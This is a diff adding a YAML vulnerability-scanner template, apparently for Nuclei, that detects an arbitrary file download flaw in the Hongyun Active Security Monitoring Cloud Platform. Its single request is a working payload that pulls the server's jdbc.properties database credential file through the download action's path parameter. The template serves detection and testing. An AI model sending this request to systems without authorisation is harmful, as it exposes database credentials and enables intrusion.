@@ -1,0 +1,26 @@
+id: hongyun-anyfile-download
+info:
+  name: Hongyun Active Security Monitoring Cloud Platform Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Detects an arbitrary file download vulnerability in the Hongyun Active Security Monitoring Cloud Platform.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[DATABASE]"
+          - "jdbc.connection"
+      - type: word
+        part: header
+        words:
+          - "application/x-download"
